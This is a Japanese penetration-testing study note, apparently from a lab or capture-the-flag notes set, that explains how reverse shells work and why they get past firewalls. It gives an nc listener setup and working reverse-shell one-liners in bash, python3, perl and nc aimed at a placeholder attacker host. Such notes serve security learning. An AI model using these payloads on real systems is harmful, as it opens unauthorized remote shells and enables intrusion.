# リバースシェルの原理

## このファイルの位置づけ

以下の作業ファイルから参照される概念ファイル：
- `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`
- `../02_Initial_Access/Web_Vulnerabilities/XSS.md`
- `../03_Post_Access_Linux/Shell_Stabilization.md`

---

## リバースシェルとは

**「標的から攻撃者に接続させる」仕組み。**

通常の操作では攻撃者からターゲットに接続しに行く（バインドシェル）が、リバースシェルでは逆にターゲット側から攻撃者側に接続させる。攻撃者はあらかじめ自分のマシンでリスナーを起動して待ち受ける。

```
[Kali（攻撃者）]          [Target（標的）]
  ncリスナー起動    ←接続←   ペイロード実行
  待ち受け状態               シェルを攻撃者に向けて送出
```

---

## なぜバインドシェルではなくリバースシェルを使うのか

**ファイアウォールを越えるため。**

多くの本番環境では、外部からターゲットへの新規インバウンド接続はファイアウォールでブロックされている。しかしターゲットから外部へのアウトバウンド通信（HTTPやHTTPSに見せかけるなど）は許可されていることが多い。

リバースシェルはターゲットが「外に出る」接続なので、このファイアウォールの非対称性を利用できる。

| 手法 | 接続方向 | ファイアウォールの壁 |
|------|---------|-----------------|
| バインドシェル | 攻撃者 → ターゲット | インバウンドポートがブロックされると使えない |
| リバースシェル | ターゲット → 攻撃者 | アウトバウンドが許可されていれば越えられる |

---

## 攻撃側の準備

### ① 自分のIPアドレスを確認する（Kali側）

```bash
ip addr
# または
ip addr show tun0   # VPN経由の場合（HackTheBox等）はtun0のIPを使う
```

### ② ncリスナーを起動する（Kali側）

```bash
nc -lvnp 4444
# -l : リスニングモード
# -v : 詳細出力
# -n : DNS名前解決しない
# -p : ポート番号指定
```

ポートは任意だが、4444・1337・9001・8080などがよく使われる。
ターゲットからの接続が来ると、そのままシェルとして操作できる。

---

## ターゲット側のペイロード例

以下は `LHOST=10.10.14.x` `LPORT=4444` の場合の例。実際の値に置き換えること。

### bash

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
# またはURLエンコード対応形式（コマンドインジェクション経由で送る場合）
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
```

### python3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### perl

```bash
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### nc（ターゲットにncがある場合）

```bash
nc LHOST LPORT -e /bin/bash
# 注意：-e オプションは古いバージョンのncにしかない。
# ncat（Nmap同梱）なら -e が使える。
```

---

## 注意点・落とし穴

- **自分のIPを間違えない**  
  VPN接続中（HTB等）は `tun0` のIPを使う。`eth0` のIPではなく。
  
- **ポートが被っていないか確認する**  
  `ss -tlnp | grep 4444` でポートが空いていることを確認してからリスナーを起動する。

- **シェルが安定していない場合はシェル安定化を行う**  
  リバースシェル直後は入力制御が不完全（Ctrl+Cで切れる・TAB補完なし等）。
  > 安定化手順 → `../03_Post_Access_Linux/Shell_Stabilization.md`

---

## 関連技術

- 前：コマンドインジェクション・XSS セッショントークン窃取など、コード実行の起点となる脆弱性
- 後：`../03_Post_Access_Linux/Shell_Stabilization.md`（シェル安定化）
